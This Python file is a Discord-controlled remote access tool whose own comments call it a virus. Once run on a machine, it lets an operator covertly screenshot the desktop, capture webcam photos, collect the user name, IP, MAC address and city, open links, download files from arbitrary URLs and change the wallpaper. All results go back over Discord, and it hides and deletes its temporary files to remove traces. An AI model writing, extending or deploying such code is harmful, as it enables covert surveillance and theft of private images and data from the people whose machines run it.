import discord
import dotenv
from getmac import get_mac_address
import os
import webbrowser
import platform
import time
import sys
import requests
import ctypes
import getpass
from tempfile import gettempdir as gettemppath
import wget
import distro
import cv2
from discord.ext import commands
from PIL import ImageGrab
temp_path = gettemppath()
path = os.path.join(temp_path, ".pic65781.png")
cam_path = os.path.join(temp_path, ".pic63791.png")
wall_path = os.path.join(temp_path, ".wallpaper1337.png")
user = getpass.getuser()
if os.name == 'nt':
    FILE_ATTRIBUTE_HIDDEN = 0x02
    for f in [path, cam_path, wall_path]:
        if os.path.exists(f):
            ctypes.windll.kernel32.SetFileAttributesW(f, FILE_ATTRIBUTE_HIDDEN)

def start():
    resp = requests.get("https://google.com")
    resp_code = resp.status_code
    if resp_code != 200:
        print("Error, no internet!")
        sys.exit()
    else:
        print("The bot is starting!")
        if os.path.isfile(path):
            os.remove(path)             #Removes traces of the virus 

        if os.path.isfile(cam_path):
            os.remove(cam_path)         #Removes traces of the virus

        if os.path.isfile(wall_path):   #Removes traces of the virus
            os.remove(wall_path)

start()

if os.path.isfile("tokens.env"):
    dotenv.load_dotenv("tokens.env")
else:
    dotenv.load_dotenv(f"/home/{user}/Desktop/tokens.env")
token = os.getenv("TOKEN")
ipinfo_token = os.getenv("IPINFO_TOKEN")

help_text = help_text = """```
1. firefox     - opens Firefox on every machine connected
2. ss          - screenshots every desktop connected 
3. list        - lists all the connected users
4  http_open   - opens a website on every connected machine, usage: !http_open https://example.com/
5. exit        - stops the bot
6. help        - shows this list
7. cam_pic     - takes a picture of the connected machines
8.capture      - captures the screen multiple times, usage: !capture 5
```"""

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

async def on_ready():
    print(f'Logged in as {bot.user}')

@bot.command()
async def firefox(ctx):
    os.system("firefox &")
    try:
        await ctx.send("Firefox opened!")
    except Exception as e:
        await ctx.send("Error!")

@bot.command()
async def ss(ctx, mac_address=None):
    if mac_address == get_mac_address():
        ImageGrab.grab().save(path)
        file = discord.File(path)
        try: 
            await ctx.send("Screenshot: ", file=file)
        except Exception as e:
            await ctx.send("Error with the ss")
        os.remove(path)
    elif mac_address == "all":
        ImageGrab.grab().save(path)
        file = discord.File(path)
        try: 
            await ctx.send("Screenshot: ", file=file)
        except Exception as e:
            await ctx.send("Error with the ss")
        os.remove(path)
    elif not mac_address:
        await ctx.send("Mac address filed is empty!")
    else:
        await ctx.send("Mac address not found!")

@bot.command()
async def list(ctx):
    os_find = platform.system()
    if os_find == "Linux":
        distro_name = distro.name(pretty=True)
        os_full = distro_name
    elif os_find == "Windows":
        win_ver = platform.release()
        os_full = f"Windows {win_ver}"
    else:
        pass
    os_full = os_find
    user = getpass.getuser()
    mac_addr = get_mac_address()
    ip = requests.get("https://api.ipify.org").text
    resp_county = requests.get(f"https://api.ipinfo.io/lite/{ip}?token={ipinfo_token}").json()
    resp = requests.get(f"https://ipinfo.io/{ip}/json/").json()
    country = resp_county.get("country", "API problem")
    city = resp.get("city", "API problem")
    try: 
        await ctx.send(f"OS: {os_full}\nUser: {user}\nIp: {ip}\nMac Address: {mac_addr}\nCountry: {country}\nCity: {city}\n========")
    except Exception as e:
        await ctx.send("Error with fetching user list!")

@bot.command()
async def rickroll(ctx, mac_address=None):
    mac_addr = get_mac_address()
    if mac_address == mac_addr:
        webbrowser.open("https://www.youtube.com/watch?v=xvFZjo5PgG0")
        try:
            await ctx.send("Rickroll successful!")
        except Exception as e:
            await ctx.send("Error!")
    elif mac_address == "all":
        webbrowser.open("https://www.youtube.com/watch?v=xvFZjo5PgG0")
        try:
            await ctx.send("Rickroll successful!")
        except Exception as e:
            await ctx.send("Error!")
    elif not mac_address:
        await ctx.send("Mac address filed is empty")
    else:
        await ctx.send("Mac address not found!")

@bot.command()
async def http_open(ctx, link, mac_address=None):
    if mac_address == get_mac_address():
        try:
            webbrowser.open(link)
            await ctx.send("Link opened!")
        except Exception as e:
            print(f"Error: {e}")
    elif mac_address == "all":
        try:
            webbrowser.open(link)
            await ctx.send("Link opened!")
        except Exception as e:
            print(f"Error: {e}")
    elif not mac_address:
        await ctx.send("Mac address filed is empty")
    else:
        await ctx.send("Mac address not found!")

@bot.command()
async def exit(ctx):
        await ctx.send("Deleting files, created by the bot..")
        if os.path.isfile(path):
            os.remove(path)             #Removes traces of the virus 
        if os.path.isfile(cam_path):
            os.remove(cam_path)         #Removes traces of the virus
        if os.path.isfile(wall_path):
            os.remove(wall_path)        #Removes traces of the virus
        time.sleep(0.5)
        await ctx.send("The bot was killed successfully!")
        await bot.close()
        await ctx.send("There was a problem the bot is still running")#Line for debugging!

@bot.command()
async def help(ctx):
    await ctx.send(help_text)

@bot.command()
async def capture(ctx, count, mac_address=None):
    if mac_address == get_mac_address():
        count = int(count)
        await ctx.send("Capturing..")
        for i in range(count):
            ImageGrab.grab().save(path)
            capt_file = discord.File(path)
            try: 
                await ctx.send(f"Sending {i+1}/{count}: ", file=capt_file)
            except Exception as e:
                await ctx.send(f"Error with the ss #{i+1}")
                os.remove(path)
                time.sleep(1)
    elif mac_address == "all":
        count = int(count)
        await ctx.send("Capturing..")
        for i in range(count):
            ImageGrab.grab().save(path)
            capt_file = discord.File(path)
            try: 
                await ctx.send(f"Sending {i+1}/{count}: ", file=capt_file)
            except Exception as e:
                await ctx.send(f"Error with the ss #{i+1}")
                os.remove(path)
                time.sleep(1)
    elif not mac_address:
        await ctx.send("Mac address filed is empty")
    else:
        await ctx.send("Mac address not found!")

@bot.command()
async def cam_pic(ctx, mac_address=None):
    mac_addr = get_mac_address()
    if mac_address == mac_addr:
        try:
            cap = cv2.VideoCapture(0) 
            ret, frame = cap.read()

            while(True): 
                    cv2.imwrite(cam_path,frame)
                    cv2.destroyAllWindows()
                    break
            cap.release()
            cam_photo = discord.File(cam_path)
            await ctx.send(f"Webcam photo: ", file=cam_photo)
            os.remove(cam_path)
        except Exception as e:
            await ctx.send("There was a problem/A webcam wasn't found")
    elif mac_address == "all":
       if mac_address == mac_addr:
        try:
            cap = cv2.VideoCapture(0) 
            ret, frame = cap.read()

            while(True): 
                    cv2.imwrite(cam_path,frame)
                    cv2.destroyAllWindows()
                    break
            cap.release()
            cam_photo = discord.File(cam_path)
            await ctx.send(f"Webcam photo: ", file=cam_photo)
            os.remove(cam_path)
        except Exception as e:
            await ctx.send("There was a problem/A webcam wasn't found")
    elif not mac_address:
        await ctx.send("Mac address filed is empty")
    else:
        await ctx.send("Mac address not found!")

@bot.command()
async def pull_pic(ctx, pic_url, mac_address=None):
    mac_addr = get_mac_address()
    if mac_address == mac_addr:
        await ctx.send("Downloading..")
        if os.path.isfile(wall_path):
            os.remove(wall_path)
        else:
            pass
        try:
            wget.download(pic_url, out=f"{wall_path}")
            await ctx.send("The file was downloaded!")
        except Exception as e:
            await ctx.send(f"Error: {e}")
    elif mac_address == "all":
        await ctx.send("Downloading..")
        if os.path.isfile(wall_path):
            os.remove(wall_path)
        else:
            pass
        try:
            wget.download(pic_url, out=f"{wall_path}")
            await ctx.send("The file was downloaded!")
        except Exception as e:
            await ctx.send(f"Error: {e}")
    elif not mac_address:
        await ctx.send("Mac address filed is empty")
    else:
        await ctx.send("Mac address not found!")

@bot.command()
async def dsk_change(ctx, mac_address=None):
    mac_addr = get_mac_address()
    if mac_address == mac_addr:
        await ctx.send("Changing wallpaper..")
        try:
            os_find = platform.system()
            if os_find == "Windows":
                ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{wall_path}" , 0)
            else:
                os.system(f"gsettings set org.cinnamon.desktop.background picture-uri file://{wall_path}") #Works only for cinnamon!
                await ctx.send("Wallpaper changed!")
        except Exception as e:
            await ctx.send("Error!")
    elif mac_address == "all":
        await ctx.send("Changing wallpaper..")
        try:
            os_find = platform.system()
            if os_find == "Windows":
                ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{wall_path}" , 0)
            else:
                os.system(f"gsettings set org.cinnamon.desktop.background picture-uri file://{wall_path}") #Works only for cinnamon!
                await ctx.send("Wallpaper changed!")
        except Exception as e:
            await ctx.send("Error!")
    elif not mac_address:
        await ctx.send("Mac address filed is empty")
    else:
        await ctx.send("Mac address not found!")

bot.run(token)